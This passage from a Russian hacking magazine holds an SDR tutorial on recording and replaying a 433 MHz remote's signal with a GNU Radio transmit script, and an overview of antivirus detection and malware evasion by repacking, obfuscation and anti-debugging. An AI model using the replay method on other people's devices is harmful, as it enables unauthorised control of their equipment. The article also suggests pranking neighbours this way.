тотах — главное, эти сигналы пра виль но сформировать программно.


При вет из Гол ландии
В качестве примера воз можнос тей SDR хочу поделиться записью, которую я
сделал в Амстердаме. Она содержит все FM‐ради останции сразу в диапа‐
зоне от 91 до 105 МГц, десять секунд такой записи занимают 660 Мбайт.
Можешь скачать этот файл и послушать, что играется на голландском радио.
  Проиграть файл можешь в бесплатной программе SDR# — в ней можно
открыть запись и слушать любую станцию, как с обычного приемника. Но в
отличие от приемника все декодирова ние идет в «цифре», а на входе лишь
цифровой поток. Думаю, теперь ты представляешь, какая вычислительная
мощность у современных SDR.


Вернемся к беспроводному пульту. Наша задача — сформировать нужный
нам сигнал, а SDR передаст его в эфир. Клас сикой для циф ровой обработки
сигналов считается программа GNU Radio. Это не просто программа,
а целый фреймворк с огромным количес твом компонентов для работы с сиг‐
налами и возможностью добавлять собственные модули. Раньше эта прог‐
рамма была доступна только в Linux, но последние версии работают и в 64‐
битных версиях Windows. Пользователи macOS могут установить GNU Radio
с помощью brew.
  В общем, устанавливаем GNU Radio, подклю чаем SDR и прис тупаем
к работе с сигналами.


ПРИЕМ
Чтобы передать сигнал, сначала нужно его принять и сохранить как образец.
Запускаем GNU Radio Companion и собира ем из бло ков схему.





                      Прием в GNU Radio

GNU Radio ориентирована на поточную обра ботку данных, в ней можно соз‐
давать из блоков схему, которая будет выполнять операции. В данном случае
мы имеем только два бло ка: Source (источник) и Sink (приемник, буквально
«слив»). Я использую SDR USRP, поэтому в качестве источника — USRP
Source. В твоем случае устройство может быть другим — ищи в документации
к твоему SDR. В качестве приемника используется FFT Sink — блок визуали‐
зации данных, который позволит нам увидеть наличие сигнала. Он не обя‐
зателен для записи, но без него будет непонят но, принимаем мы сигнал
или нет.
  В свойствах приемника я также ука зал час тоту, на которой мы хотим при‐
нимать, — 434 МГц. Частоту дискретизации (sample rate) я установил рав‐
ной 128 000, этого достаточно для записи сигнала. Запускаем проект в GNU
Radio, подносим пульт поближе к антенне, нажима ем на нем любую кнопку, и,
если все было сделано пра вильно, мы увидим хорошо заметный всплеск сиг‐
нала на спектре.





                     Спектр сигнала в GNU Radio

Если сигнал виден нор мально, мы можем его записать. Добавляем блок File
Sink.





                 Схема в GNU Radio с бло ком записи

GNU Radio для Windows требует абсолютные пути файлов, иначе ничего
не работает. В Linux такой проб лемы нет.
  Запускаем программу, нажимаем кнопку на пульте, закрываем программу.
В указанной нами папке должен появиться файл 433_signal.iq размером
примерно 5 Мбайт, содержащий наш сигнал. Его можно открыть в любом
аудиоредакторе, например в Cool Edit, если выб рать тип файла «стерео» (в
SDR пишутся два канала, называемых I и Q) и тип данных float. Мы же откро‐
ем его с помощью Python и библиотеки для научных расчетов NumPy.


import numpy as np
import matplotlib.pyplot as plt


data = np.fromfile('433_signal.iq', dtype=np.float32)
data_2ch = np.reshape(data, (‐1, 2))
data_left = data_2ch[:, ‐1]
rate = 128000


plt.figure(1)
time = np.linspace(0, len(data_left)/rate, num=len(data_left))
plt.plot(time, data_left)
plt.tight_layout()
plt.show()

Записанный файл не имеет заголовка wav, а содержит непосредствен но дан‐
ные float, так что частоту дискретиза ции и тип данных необходимо указать
вручную. Также с помощью np.reshape входной одномерный массив пре‐
образуется в двумерный: запись у нас содержит два канала. Для удобства
отображения я вывожу только один канал.
  Запускаем программу и видим наш сигнал.





                        Сиг нал в Matplotlib

Чтобы избежать искажения, уровень записи не должен быть слишком
высоким и упираться в 1.0. При этом он не должен и быть слишком низким,
иначе качество передаваемого сигнала будет плохим. Уровень сигнала меж‐
ду 0.5 и 1.0 — оптимальный. В моем случае было достаточно держать пульт
при записи в нескольких сантиметрах от антенны.
   Если ты не видишь ничего, а вместо этого выдается ошибка отсутствия
библиотеки NumPy или Matplotlib, то нуж но их уста новить:
 • в Windows: C:\Python3\Scripts\pip.exe  install  numpy  mat
  plotlib;
 • в Linux: $ sudo pip install numpy scipy matplotlib;
 • в последних версиях macOS: $ pip3 install numpy scipy mat
  plotlib user.


ПЕРЕДАЧА
После того как мы записали сигнал, нужно соб рать блок‐схе му для его
передачи. Принцип такой же, но с небольшими отличиями.





                    Переда ча в GNU Radio

Блок File Source — источник нашего сигнала — для этого мы его и записы‐
вали. Блок Throttle указывает, с какой скоростью сигнал будет подаваться
на передатчик. В нашем случае частота дискретизации равна 128 000. Multiply
Const слегка увеличивает уровень сигнала, чтобы он был близок к единице:
это позволяет максимально использовать мощность передатчика. И наконец,
блок USRP  Sink передает данные в реальный SDR. Уровень  сигнала
на выходе (Gain) я установил равным 70, для других моделей SDR это чис ло
может отличаться.
   Это зависит еще и от удаленности от управляемо го устройства — в моем
случае беспроводной пульт управляет лампой, которая висит в дру гой ком‐
нате. Поэтому мощность я уста новил побольше. Час тота передачи указана та
же, что использовалась для приема. Модуль Scope Sink не обязательный
и служит для контроля передаваемых данных.
  Проверяем. Запускаем программу, и на SDR включается светодиод TX,
лампа загорается.
  После того как программа готова и отлажена, GNU Radio Companion мож‐
но не использовать. Для этого в настройках проекта меняем WX GUI на No
GUI и выбираем опцию Run to Completion, убираем блок Scope Sink. Затем
выбираем в меню Run → Generate, соз дается файл top_block.py, который
и содержит  готовое приложение на  Python.  Его можно использовать
из командной строки, как любую дру гую программу на Python.
  Можно открыть файл top_block.py и убедить ся, что код понятен и при
желании его можно изменить.


GNU Radio Python Flow Graph
from gnuradio import blocks
from gnuradio import eng_notation
from gnuradio import gr
from gnuradio import uhd
from gnuradio.eng_option import eng_option
from gnuradio.filter import firdes
from optparse import OptionParser
import time



class top_block(gr.top_block):


    def __init__(self):
        gr.top_block.__init__(self, "Top Block")


        # Variables
        self.samp_rate = samp_rate = 128000


        # Blocks
        self.uhd_usrp_sink_0 = uhd.usrp_sink(
          ",".join(("", "")),
          uhd.stream_args(cpu_format="fc32", channels=range(1),),
        )
        self.uhd_usrp_sink_0.set_samp_rate(samp_rate)
        self.uhd_usrp_sink_0.set_center_freq(434000000, 0)
        self.uhd_usrp_sink_0.set_gain(70, 0)
        self.uhd_usrp_sink_0.set_antenna('TX/RX', 0)
        self.blocks_throttle_0 = blocks.throttle(gr.sizeof_gr_complex
*1, samp_rate,True)
        self.blocks_multiply_const_vxx_0 = blocks.multiply_const_vcc(
(1.8, ))
        self.blocks_file_source_0 = blocks.file_source(gr.sizeof
_gr_complex*1, 'D:\\Temp\\1\\433_signal.iq', False)


        # Connections
        self.connect((self.blocks_file_source_0, 0), (self.blocks
_throttle_0, 0))
        self.connect((self.blocks_multiply_const_vxx_0, 0), (self.
uhd_usrp_sink_0, 0))
        self.connect((self.blocks_throttle_0, 0), (self.blocks
_multiply_const_vxx_0, 0))


    def get_samp_rate(self):
        return self.samp_rate


    def set_samp_rate(self, samp_rate):
        self.samp_rate = samp_rate
        self.uhd_usrp_sink_0.set_samp_rate(self.samp_rate)
        self.blocks_throttle_0.set_sample_rate(self.samp_rate)


def main(top_block_cls=top_block, options=None):
    tb = top_block_cls()
    tb.start()
    tb.wait()


if __name__ == '__main__':
    main()

Если ты знаешь Python, можешь модифицировать программу по своему
усмотрению. Например, ты можешь передавать имя записанного файла
через параметр командной строки, что поз волит симулировать нажатие раз‐
ных кнопок пульта.
  Проверяем: открываем Power Shell и запус каем программу, лампа должна
загореться.





              Переда ча сигнала из командной строки

Таким способом можно принимать и переда вать разные сигналы — не только
от пульта, но и от любого устройства, работа ющего по аналогичному прин‐
ципу. Простор для эксперимен тов огромный.
  Передавать с помощью SDR мы можем любой записанный сигнал — мож‐
но записать FM‐станцию в городе, затем «ретранслировать» ее на даче. Сиг‐
нал будет передаваться как есть, включая RDS и стерео. Можно даже уве‐
личить частоту дискретиза ции и передавать сра зу несколько FM‐станций
парал лельно. Все  зависит  только  от  того,  сколько  дис кового места
под запись тебе не жалко и какова максимальная ширина полосы пропус‐
кания твоего SDR. Единс твенный недостаток — выходная мощность SDR
довольно мала, и дальность будет небольшой.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ
      ЛОВИ СИГНАЛ!
          УЧИМСЯ ПЕРЕДАВАТЬ СИГНАЛ И УПРАВЛЯТЬ
                           ЧУЖОЙ ТЕХНИКОЙ





ПЕРЕХВАТ СЛАБОГО СИГНАЛА
Рассмотрим теперь более сложную задачу. Представим, что физического
доступа к пульту у нас нет. Для примера я записал сигнал с пульта, находя‐
щегося в другой комнате. Открываем его с помощью Python и смотрим
на результат.





                        Слабый сигнал

Если сравнить с предыдущей записью, сигнал сла бее в двести раз, уровень
шумов выше. Наш прежний подход тут не сра ботает: SDR ведь не знает, что
ему нужно передать, и он передаст слабый и шумный сигнал. Попробовать
можно, но результат очевиден: лампа не загорается.
   Есть целых три способа решить эту задачу.
  Вариант 1 — просто уве личим уро вень сигнала. У нас ведь Soft‐
ware Deﬁned Radio: что хотим в цифре, то и делаем. Изменим параметр Multi‐
ply Const с 1.8, ну, например, на 300. Если точнее, нам нужно открыть Scope
Sink и подобрать параметр так, что бы сигнал стал в диапазоне от 0.5 до 0.9.





                      Сиг нал пос ле усиления

Результат: запускаем прог рамму, лампа горит. Но такой способ я не могу
рекомендовать. Причина прос та: вмес те с полезным сигналом мы передаем
в эфир весь усилен ный шум и мусор, что снижает эффективность передачи
и заполняет ненужными помеха ми радиоэфир.
  Посмотри, что переда ется в эфир: сверху сигналы от настоящего пульта,
жирный сигнал снизу — это наш, усиленный в трис та раз вместе с шумом сиг‐
нал.





                          Сиг нал в эфире

Вариант 2 — добавим полосо вой фильтр. Он просто обрежет все лиш‐
нее.
  Вернемся к спектру сигнала: пик приходится на частоту 6,5 кГц.





                     Спектр сигнала в GNU Radio

Все вокруг него — шум, который можно и нужно убрать. Заменяем блок Multi‐
ply Const на блок Band Pass Filter, ука зываем параметры верхней и нижней
границы в 4 и 9 кГц — центральная час тота с небольшим запасом влево
и вправо. Усиление в триста раз зададим в парамет ре Gain.





                   Схема соединений в GNU Radio

Запускаем:  все  работает,  лампа  загора ется.  Интересно  посмотреть
на спектр сигнала — он получился гораз до компактнее по занимаемой
полосе (верхний сигнал), чем сигнал оригинального пульта (нижний сигнал).





             «Цифровой» и «обычный» сигналы в эфире

Неудивительно — в дешевые китайские пульты ста вят простей шие компонен‐
ты ценой менее дол лара, и на качество тут рас счи тывать не приходится.
  Мы убрали шум вокруг сигнала, но в самой полосе сигнала данные так
и передаются вместе с шумом, который был записан из эфира. Кардинальный
способ улучшить это — отказать ся от передачи записанного сигнала в эфир
и сформировать цифровой сигнал заново, без шумов.
  Вариант 3 — сформиру ем сигнал заново, с нуля.





                   Схема соединений в GNU Radio

Не пугайся. Если рассматривать прохождение сигнала слева направо, то все
становится проще.
  Мы знаем, что наш пульт переда ет в АМ, так что первым шагом мы выпол‐
няем демодуляцию АМ. Для этого исходный сиг нал пульта, находя щийся
на частоте 6,5 кГц от центра, смещается на нулевую частоту умножением
на синусоидальный сигнал. Вспомина ем школь ную формулу умножения
косинусов — результатом будет сумма и разность частот.
  Затем мы убираем лишнее с помощью Low Pass Filter и выделя ем ампли‐
туду сигнала с помощью Complex to Mag. Как ты помнишь, из SDR при ходят
два потока данных, называемых  I и Q, которые в GNU Radio представлены
как комплексные числа. На выходе после Complex to Mag мы имеем демоду‐
лированный сигнал АМ.
   Теперь нужно преобразовать наш сигнал в бинарный, для чего исполь‐
зуется блок Threshold. Он делает то, ради чего это затевалось, — пре обра‐
зует шумный входной сигнал в чистый выходной. Посмотри на разницу.





                  Сиг нал до и пос ле бло ка Threshold

Мы имеем неплохой запас по отношению сигнал/шум, а значит, могли бы
принять еще более слабые сигналы.
  И последнее: передача сформированного сигнала обратно в эфир.
Для этого мы сдвигаем его обратно на те же 6,5 кГц, обрезаем все лишнее
с помощью Band Pass Filter (исходный цифровой сиг нал прямоугольный, так
что он имеет мно го ненужных нам гармоник), и окончательные данные пос‐
тупают на USRP Sink.
  Последний тест: запускаем программу, лампа загорается.
   Если убрать Band Pass Filter, то на выходе мы получаем широкий спектр,
точно такой же, как у оригинального пульта. Из этого мы можем сделать
вывод: китайцы сэкономили, и никакого выходного фильтра в этом пульте нет.
Они просто взяли генера тор на 434 МГц и модулируют его цифровым
управляющим  сигналом.  Скорее  всего,  прос тей ший  микроконтрол лер,
который генерирует цифровые сигналы при нажатии кнопок, напрямую под‐
клю чен ко входу Enable микросхемы генера тора ВЧ.
   Так, не вскрывая пульт, с помощью одной только математики, мы выяс‐
нили, что у него внутри.
  Можно ли принять сигнал, который будет еще слабее и расположен
еще дальше? Да, можно, если вос пользовать ся тем, что пульт передает пов‐
торяющиеся одинаковые посылки. Для этого уже одного GNU Radio будет
мало, придется написать функцию накопления и усреднения сигнала. Тогда
отношение сигнал/шум можно будет повысить. Примерно так астрономы при‐
нимают слабые сигналы на радиотелескопы. Или можно сделать направлен‐
ную антенну на 433 МГц.
  Способы есть, как программные, так и аппа ратные, если этот сигнал тебе
действительно очень нужен.


ЧТО ДЕЛАТЬ, ЕСЛИ НИЧЕГО НЕ РАБОТАЕТ?
Допустим, ты сделал все, как написа но выше, но ничего не работает. Где
копать?
   Электроника — наука точная, и чудес здесь не бывает. Для начала стоит
проверить прием: убе диться, что в записанном файле есть сигнал и его уро‐
вень хорош. В записанном файле должен быть четко различимый сигнал.
Если сигнала нет, проверь усиление приемника и час тоту. Возможно, частота
пульта другая или сигнал инфракрасный, а не радио.
   Чтобы не возиться с файлами, запусти SDR# и прос то пос мотри, что есть
на экране во время нажатия кнопок пульта. Если ты не знаешь точную час тоту,
настрой максимальную полосу обзора в тво ем SDR, например 10 МГц,
и нажимай кнопки пульта — где‐то этот сигнал дол жен быть. Разуме ется, пока
не получишь сигнал, даль ше двигаться бес полезно.
   Когда частота известна и сигнал записан, можно проверять передачу.
Важные параметры: антенна и мощность сигнала. От этого зависит дальность
передачи. Мощность задается в нас трой ках SDR, этот параметр обычно
называется Gain. Антенну в идеале лучше исполь зовать готовую на 433 МГц,
например от портатив ной радиостанции. Если такой антенны нет, сойдет
и кусок провода, воткнутый в антенное гнез до, но с ним дальность передачи
будет гораздо меньше. Для начала лампу (или  то, чем мы управляем)
желательно разместить рядом с SDR на рабочем столе, а убе дившись, что
все работает, уже можно сделать тес ты на дальность.
   Качество передачи удобно проверять с помощью SDR# и контрольного
приемника RTL SDR, спектр сигнала мож но вывес ти на второй монитор. Если
передачи нет совсем, смотри в консоли GNU Radio сообщения об ошибках —
возможно, не установлен правиль ный драйвер или в настрой ках передатчика
выбрано другое антенное гнездо. Главное, чтобы ты не пытал ся передавать
с помощью RTL SDR.
  Все это наверняка будет работать только с простыми устрой ствами,
которые передают жестко зашитые сигналы. Теоретичес ки, если сигнал
не содержит динамически изменяемых полей, спо соб передачи заранее
записанного сигнала будет работать, если же устройства обме ниваются дан‐
ными или ключами, то ничего не выйдет.
   Что касается дальности, то с SDR и антенной от рации на 433 МГц мне
удавалось зажечь лампу, находящуюся в другом конце квартиры, а если спе‐
циально сделать направленную антенну, то дальность можно уве личить.


ЗАКЛЮЧЕНИЕ
Управлять некоторыми беспро водными устройствами с помощью SDR воз‐
можно и даже интересно в плане программирования и математики.
  С точки зре ния уяз вимос ти: еще раз повторю, что простые пульты,
которые разбирались в  тексте, никакой защиты не име ют. Это плата
за дешевизну и простоту конструкции. С другой сто роны, ничего серьезного
к таким пультам обыч но и не подключают. Гораздо более вероятна проблема
не «хакер с ноутбуком», а банальное совпадение каналов.
  Мощный обогреватель я бы подключал к радиоуправле нию с большой
осторожностью и обесточивал бы при длительных отъ ездах в отпуск, а канал
лучше сменить с дефолтного на другой в настройках пульта. А если твои
друзья или соседи накупили радиоуправляемых лампочек — ты знаешь, как их
разыграть на пер вое апреля.
ВЗЛОМ
 КАК РАБОТАЮТ
 АНТИВИРУСЫ





      МЕТОДЫ ДЕТЕКТИРОВАНИЯ
      ВРЕДОНОСНЫХ ПРОГРАММ




Дискуссии о том, нужны ли антивирусы,
или они совер шенно бесполезны, не ути‐
хают с момента появ ления самих анти‐
вирусных приложений. Примерно столько
же длится непрекращающаяся борьба меж‐       Валентин Холмогоров                                                                                               valentin@holmogorov.ru
ду  вирмейкерами  и  произво дите лями
защитного ПО: одни постоян но изобрета ют
все новые и новые алгоритмы детектирова‐
ния, другие стремятся во что бы то ни ста ло
их обойти.


Как работают современные  антивирус ные программы и  какие методы
используют злоумышленники для борьбы с ними? Об этом — сегодняшняя
статья.


КАК АНТИВИРУСНЫЕ КОМПАНИИ ПОПОЛНЯЮТ БАЗЫ?
Применительно к современным антивирус ным технологиям само понятие
«антивирус» — это скорее дань моде, нежели термин, правильно отра‐
жающий суть вещей. Классичес кие файловые вирусы, то есть вредоносные
программы, способ ные заражать исполня емые файлы или динамические
библиотеки и распространять ся без участия пользователя, сегодня очень
большая  редкость.  Подавляющее  большинс тво  встречающихся  сей час
в «дикой природе» вредоносов — это трояны, не спо собные ни к заражению
файловых объектов, ни к саморепликации. Чуть реже в руки аналитиков
попадаются черви: эти программы могут соз давать свои копии на съемных
носителях или сетевых дисках, «расползать ся» по сети или каналам электрон‐
ной почты, но файлы заражать не умеют. Все остальные традиционные
категории вредоносного ПО отличаются  друг  от друга лишь базовым
набором функций, но по своей архитектуре могут быть сведены к этим трем
группам.
   Как образцы вредоносов попада ют в вирус ные лаборатории? Каналов
поступления новых семплов у антивирус ных компаний традиционно несколь‐
ко. Прежде всего, это онлайн‐сервисы вроде VirusTotal, то есть серверы,
на которых любой анонимный пользователь может проверить детектирование
произвольного файла сра зу десятком самых популярных антивирусных движ‐
ков. Каждый загруженный обра зец вне зависимос ти от результатов проверки
автоматически отправляется вендорам для более детального исследования.
  Очевидно, что с подоб ных ресурсов в вирусные лаборатории прилетает
огромный поток мусора, вклю чая совершенно безобидные текстовые файлы
и картинки, поэтому на входе он филь тру ется спе циально обученными
роботами и только после это го передается по конвейеру дальше. Этими же
сервисами успешно поль зуются небольшие компании, желающие сэкономить
на содержании собственных вирус ных лабора торий. Они тупо копиру ют
в свои базы чужие детекты, из‐за чего регулярно испы тывают эпические фей‐
лы, когда какой‐нибудь вендор в шутку или по недоразумению поставит вер‐
дикт infected на тот или иной компонент такого анти вируса, после чего тот
радостно перено сит в карантин собственную биб лиотеку и с грохотом валит‐
ся, вызывая баттхерт у пользователей и истеричес кий хохот у конкурентов.
   Второй канал — «самотек», подозрительные фай лы, которые пользовате‐
ли передают в вир лаб через сайт антивирус ной компании, по запросу службы
поддержки или выгружа ют из карантина. Третий канал — ханипоты, спе циаль‐
ные приманки для вирмейкеров в виде вир туаль ных серверов с открытыми
наружу портами и логина ми‐паролями вроде  root/root, куда некоторые
ботоводы радостно заливают свои тво рения, дивясь кривору кости админов.
Наконец, четвертый путь — обмен базами между самими вендорами, но в
последние годы в силу обос трившейся конкуренции на рынке и сузившейся
кормовой базы коопе рация меж ду антивирусными компаниями практически
сошла на нет.
  После того как семпл попада ет в вирусную лабораторию, он сортируется
по типу файла и исследуется авто матическими средствами аналитики,
которые могут установить вердикт по формальным или техничес ким приз‐
накам — например, по упаковщику. И только если роботам раскусить вре‐
доноса не удалось, он переда ется вирус ным аналитикам для проведения
инструментального или ручного ана лиза.


АНАТОМИЯ АНТИВИРУСА
Антивирусные программы раз личных производителей включают в себя раз‐
ное число компонентов, и даже более того, одна и та же компания может
выпускать несколько версий антивиру са, включающих определенный набор
модулей и ориентированных на раз личные сег менты рынка. Например,
некоторые антивирусы рас полагают компонентом родительского контроля,
позволяющего ограничивать доступ несовершеннолетних пользователей
компьютера к сайтам определенных категорий или регулировать время их
работы в системе, а некоторые — нет. Так или ина че, обычно современные
антивирусные приложения обла дают следующим набором функциональных
модулей:
 • антивирусный сканер — утилита, выполняющая поиск вредонос ных прог‐
  рамм на дисках и в памяти устройства по запросу пользователя или по
   расписанию;
 • резидентный монитор — компонент, выполняющий отсле живание сос‐
   тояния системы в режиме реального времени и блокиру ющий попытки
   загрузки или запуска вредонос ных программ на защищаемом компьюте‐
   ре;
 • брандмауэр (файрвол) — компонент, выполняющий мониторинг текущего
   соединения, вклю чая анализ вхо дящего и исходящего трафика, а также
   проверяющий исходный адрес и адрес наз начения в каждом переда‐
  ваемом с компьютера и пос тупа ющем на компьютер пакете информа‐
   ции — данные, поступа ющие из внешней среды на защищенный брандма‐
   уэром компьютер без предварительного запроса, отслеживаются и филь‐
   труются. С функциональ ной точки зрения брандмауэр выс тупает в роли
   своеобразного филь тра, контро лирующего поток передаваемой между
   локальным компьютером и интернетом информации, защитного барьера
  между компьютером и всем остальным информационным пространством;
 • веб‐антивирус — компонент, предотвращающий доступ пользователя
   к опасным ресурсам, рас простра няющим вредоносное ПО, фишинговым
   и мошенническим сайтам с использованием специальной базы данных
   адресов или системы рейтингов;
 • почтовый антивирус — приложение, выполняющее проверку на безопас‐
   ность вложений в сооб щения электронной почты и (или) пересы лаемых
   по электронной почте ссылок;
 • модуль антируткит — модуль, предназначенный для борьбы с руткитами
   (вредоносными прог рамма ми, обладающими способностью скры вать
   свое присутствие в инфициро ванной системе);
 • модуль пре вентивной защиты — компонент, обеспечивающий целос‐
   тность жизненно важных для работос пособности системы данных и пре‐
   дотвращающий опасные действия прог рамм;
 • модуль обновле ния — компонент, обеспечивающий  своевременное
   обновление других модулей антивируса и вирус ных баз;
 • карантин —  централизованное защищенное  хранилище,  в  которое
  помещаются подозритель ные (в некоторых случаях — опре деленно инфи‐
   цированные) файлы и приложения до того, как по ним будет вынесен окон‐
   чательный вердикт.

В зависимости от версии и наз начения антивирус ной программы, она может
вклю чать в себя и другие функциональные модули, например компоненты
для централизованного администрирования, удаленного управле ния.


Сигнатурное детек тирование
Современные  антивирус ные программы используют несколько методик
обнаружения вре донос ных программ в различных их сочетаниях. Основная
из них — это сигнатурное детектирование угроз.
  Данный метод детектирова ния мал вари основывается на соз дании так
называемых сигнатур — уникальных цифровых идентификаторов файла,
представ ляющих собой специальный набор бай тов и получаемых на основе
содержимого исследуемого файла. Фактически сигнатура — это своего рода
«отпечаток пальцев» файла: с помощью сигнатуры можно однозначно иден‐
тифицировать тот или иной файл или при ложение. Схожим образом устроены
хеши файлов, например SHA‐1 или SHA‐256, — при этом под хешированием
в данном случае понимается преобразование содержимого фай ла с исполь‐
зованием однонаправленной матема тической функции (алгоритма крип‐
тографического хеширования), в результате которого получается уникальный
набор шестнадцатеричных символов. Однонаправленной  такая функция
называется потому, что получить из файла хеш очень прос то, а вот восста‐
новить из хеша исходный файл уже невозможно. Вирусная сигнатура устро‐
ена несколько сложнее: помимо хеша, она содержит еще целый ряд уникаль‐
ных признаков файла.
   Сигнатуры собираются в блок данных, называ емый вирусными базами.
Вирусные базы антивирусных программ периодичес ки обновляются, чтобы
добавить в них сигнатуры новых угроз, исследованных за истекшее с момента
последне го обновле ния время.
   Антивирусная программа исследует хранящиеся на дисках (или загружа‐
емые из интернета) файлы и сравнивает результаты исследования с сиг‐
натурами, записанными в антивирусной базе. В случае совпадения такой
файл считается вредоносным. Данная методика сама по себе име ет зна‐
чительный изъян: зло умышленнику достаточно изменить структуру файла
на несколько байтов, и его сигнатура изменится. До тех пор пока новый обра‐
зец вредоноса не попадет в вирусную лабора торию и его сигнатура не будет
добавлена в базы, антивирус не сможет рас познать и ликвидировать данную
угрозу.


По веден ческий анализ
Помимо сигнатурного детектирова ния, большинс тво современных анти‐
вирусных программ используют те или иные механиз мы поведенческого ана‐
лиза. Поведенческий анализ можно отнести к раз новидности вероятнос тного
анализа — как это и следует из названия данного метода, анти вирусная прог‐
рамма следит за поведением приложений и, если оно кажется ей подоз‐
рительным, блокирует работу потенциально опас ной программы.
  Один из безопасных методов исследовать поведение приложения —
запустить его в так называемой песочнице (sandbox) — защищенном изо‐
лированном виртуальном контейнере, из которого при ложение не может
получить доступ к компонентам ОС и фай ловой системе. Если поведение
программы вызывает у антивируса подозрения, например она выполняет
инжект, модифицирует загрузочную запись или изменяет структуру исполня‐
емого файла, она может быть признана потенциально опасной или вредонос‐
ной.


Эвристический анализ
Эвристический анализ — разновидность вероятнос тного анализа вредонос‐
ных программ, основанная на логических алгоритмах, поз воляющих выявить
и обезвредить потенциально опасное приложение. Эвристический анализ
приходит пользователям на помощь в тех слу чаях, когда угрозу не удается
обнаружить с помощью сигнатурного детектирования.
   Упрощая, основной принцип эвристичес кого ана лиза можно опи сать сле‐
дующим образом. Каждой функции, которую может реализовывать прог‐
рамма в операционной системе, наз нача ется некий условный «рейтинг опас‐
ности». Какие‐то действия приложения могут считаться менее опасными, дру‐
гие — более. Если по совокупности выполняемых при ложением действий оно
превышает некий условный «порог безопасности», оно признается потен‐
циально вредоносным.
  Например, если программа работает в фоновом режиме, не име ет гра‐
фического интерфейса, пос ледова тельно опра шивает удаленные серверы,
а потом пытается скачать с них и запус тить в сис теме какое‐то приложение,
она с высокой долей вероятности может ока заться троянцем‐загрузчиком.
Или утилитой обновления браузера Google Chrome. В этом, очевидно, и кро‐
ется основная ахиллесова пята эвристического метода анализа вирусных
угроз — большая вероятность «фолс‐позитива», ложного срабатывания.
  Другой метод эвристического анализа — эму ляция исполнения прог‐
раммы. Антивирус загружа ет подоз рительное приложение в собственную
буферную память, разбирает код на инструкции и выполняет их по оче реди,
проверяя результат.
  Эвристический анализ применя ется с целью выявить и обезвредить угро‐
зы, еще неизвестные антивиру су — то есть те, сигнатуры которых на текущий
момент отсутствуют в вирус ных базах. Отсю да логичес ки вытекает еще один
недостаток эвристических алго ритмов — даже если неизвестную ранее угро‐
зу удается обнаружить, ее далеко не всег да получается сразу «вылечить».
Во многих случаях поль зователю приходится ожидать появления оче редного
обновления вирусных  баз, содержащего  алгоритмы лечения конкретно
для этой вредоносной программы.


Про активная защита (HIPS)
Проактивную антивирусную защиту (HIPS — Host‐based Intrusion Prevention
System, англ. «система предотвра щения вторжений») также можно отнести
к разновидности антивирусной защиты на основе поведенческого анализа.
Антивирус сле дит за запущенными приложениями и информирует поль‐
зователя о тех или иных действиях программы. Решения о том, позволить
или запретить программе выполнять какое‐либо дей ствие, принимает поль‐
зователь. Это классический вариант реализации HIPS. Существует еще так
называемый экспертный вариант, при котором антивирус самостоятельно
блокирует действия тех или иных приложений на основе набора заложенных
в него правил и разрешений. Пользователь может при необ ходимости
добавить какую‐либо прог рамму в список исклю чений, разрешив ей выпол‐
нение любых или толь ко выб ранных дей ствий в защищаемой системе.


МЕТОДИКИ ПРОТИВОДЕЙСТВИЯ АНТИВИРУСАМ
К сожалению, борьба вирусо писа телей и про изводителей антивирусных
программ носит перманентный характер: первые непрерывно изобретают
все новые и новые способы обхо да анти вирус ной защиты, вторые — ста‐
раются совершенствовать алгорит мы поиска и обнаружения вредонос ного
ПО. Давай перечислим основные методики, которыми пользуются вирмей‐
керы.


Пе реупаковка
Самый распространенный и  популярный  метод,  активно применяемый
вирусописателями для обхода сигнатурного детекта. Как я уже говорил, сиг‐
натуру можно назвать своего рода ана логом отпечатков пальцев каждого
конкретного файла, при этом она уникальна для файлового объекта. Соот‐
ветственно, если в файл будут внесены даже нез начительные изменения,
антивирус не сможет «опоз нать» его с помощью сигнатуры, и такой файл
не будет детектироваться антивирусом до тех пор, пока не попадет в иссле‐
довательскую лабораторию.
  Наиболее простой спо соб изменить структуру файла, не меняя его фун‐
кциональных возможнос тей, — это «накрыть» его программным упаков‐
щиком. Программные упаковщики сжи мают содержимое файла приложения
и дописывают к нему код, необходимый для распаковки и выполнения прог‐
раммы. Некоторые из них к тому же включают различные функции шиф‐
рования, затрудняющие ана лиз и исследова ние подобного приложе ния.
Этим и пользуются зло умышленники.
  При каждой повторной упа ковке файла его сигнатура меняется, и он ста‐
новится «невидимым» для системы сигнатурного детектирования антивиру са.
Некоторые вирусописатели, чтобы затруднить исследование вируса или тро‐
яна, упаковывают и шифруют свои творения в «несколько слоев» — тогда
под одним упаковщиком прячется дру гой сжатый и зашифрованный объ ект,
под ним — еще один, и вся конс трукция напоминает в итоге эдакую логичес‐
кую матрешку, доб раться до «сердцевины» которой бывает весьма непросто.
   Иногда кибер преступники применя ют и иной метод: на сервере, с которо‐
го жертвам раздается вредоносное ПО, уста навливается специальный сце‐
нарий. При активизации это го сценария (например, при переходе поль‐
зователя по ссылке) он извлекает из соответству ющей директории сервера
бинарный файл вредоно са, упаковывает его на лету и только после этого
«отдает» его поль зователю. Таким обра зом каж дая жертва получает свой
собственный,  уникальный  экземпляр  вредоносной  программы,  гаран‐
тированно не детектируемой по сигнатуре.


Об фускация
Обфускация (от англ. obfuscate — «запутывать», «сбивать с тол ку») — соз‐
нательное запутывание, усложнение кода вредоносной программы с сох‐
ранением ее функциональнос ти, что бы затруднить ее исследование и анализ.
В целях обфускации вирусописатели иногда добавляют в приложение
«мусорный» код, ненужные инструкции, мно жес твенные переходы и многок‐
ратные вызовы различных функций. Существу ют специальные утилиты, соз‐
данные для запутывания кода приложений, — обфускаторы.
  Обфускация приложений затрудняет реверс‐инжиниринг, то есть деком‐
пиляцию вредоносной программы и изу чение ее функциональных воз‐
можностей на уровне кода, однако одновременно с этим усложняет вирусо‐
писателям отладку приложения, а в некото рых слу чаях — увеличивает его
размер и снижает быстро действие.


Ан тиотладка
Большинство современных вредоносных программ оснащены мощными
механизмами антиотладки, препятству ющими их иссле дованию. Ряд вирусов
и троянов в момент начала работы про веря ют, не пытаются ли их запустить
в изолированной среде («песочнице»), под отладчи ком или в виртуальной
машине. Реализовано это раз ными метода ми — например, вре донос пыта‐
ется получить име на работающих процес сов (и сравнить их с заданным спис‐
ком), ищет характерные строки в заголовках открытых окон. Если вредонос‐
ное приложение определяет попыт ку запус ка в виртуальной среде или под
отладчиком, оно завершает свою работу.
   Аналогично многие вредоносы ищут среди уста новленных или запущенных
программ приложения популярных антивиру сов и пытаются завершить их,
а если это не получается, выгружа ются сами. Быва ют и более интерес ные
